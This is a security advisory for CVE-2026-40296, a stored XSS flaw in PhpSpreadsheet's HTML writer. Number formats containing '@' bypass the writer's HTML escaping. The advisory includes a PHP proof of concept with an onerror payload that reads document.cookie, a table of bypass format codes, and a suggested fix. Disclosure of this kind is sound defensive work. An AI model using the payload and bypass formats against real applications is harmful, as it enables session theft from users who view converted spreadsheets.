# [M] PhpSpreadsheet has XSS via number format code with @ text placeholder bypasses htmlspecialchars in HTML writer

## Summary
Severity: Medium
Advisory: GHSA-hrmw-qprp-wgmc
CVE: CVE-2026-40296
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-28
Source: https://github.com/advisories/GHSA-hrmw-qprp-wgmc
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.7.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.16
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.4

## Details
It was discovered that there is a way to bypass HTML escaping in the HTML writer using custom number format codes.

## The Problem

In `Writer/Html.php` around line 1592, the code checks if the formatted cell data equals the original data to decide whether to apply `htmlspecialchars()`:

```php
if ($cellData === $origData) {
    $cellData = htmlspecialchars($cellData, ...);
}
```

When a cell has a custom number format containing `@` (text placeholder) with any additional literal characters, the formatter replaces `@` with the cell value and adds the extra characters. This makes `$cellData !== $origData`, so `htmlspecialchars()` is **skipped entirely**.

Even a single trailing space in the format (`@ `) is enough to bypass the escape.

## Proof of Concept

```php
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Html;
use PhpOffice\PhpSpreadsheet\Cell\DataType;

$spreadsheet = new Spreadsheet();
$sheet = $spreadsheet->getActiveSheet();

// XSS payload with malicious number format
$sheet->setCellValueExplicit('A1', '<img src=x onerror=alert(document.cookie)>', DataType::TYPE_STRING);
$sheet->getStyle('A1')->getNumberFormat()->setFormatCode('. @');

$writer = new Html($spreadsheet);
$writer->save('output.html');
```

The generated HTML contains:
```html
<td>. <img src=x onerror=alert(document.cookie)></td>
```

The XSS payload is **completely unescaped**.

## Tested Bypass Formats

| Format Code | Result | Escaped? |
|---|---|---|
| `General` (default) | Original value | YES (safe) |
| `. @` | `. ` + value | **NO (XSS!)** |
| `@ ` (trailing space) | value + ` ` | **NO (XSS!)** |
| `x@` | `x` + value | **NO (XSS!)** |

This was tested with PhpSpreadsheet 4.5.0 and confirmed the XSS executes in the browser.

## Impact

Any application that:
1. Accepts uploaded XLSX files from users
2. Converts them to HTML using PhpSpreadsheet's HTML writer
3. Displays the HTML to other users

...is vulnerable to stored XSS. The attacker embeds the payload in a cell value and sets a custom number format in the XLSX file's `xl/styles.xml`.

## Suggested Fix

Always apply `htmlspecialchars()` regardless of whether formatting changed the value:

```php
// Instead of conditional escaping:
$cellData = htmlspecialchars($cellData, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
```

Or escape AFTER formatting, not conditionally based on equality.

## Reporter
Keyvan Hardani

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hrmw-qprp-wgmc
- https://nvd.nist.gov/vuln/detail/CVE-2026-40296
- https://github.com/PHPOffice/PhpSpreadsheet
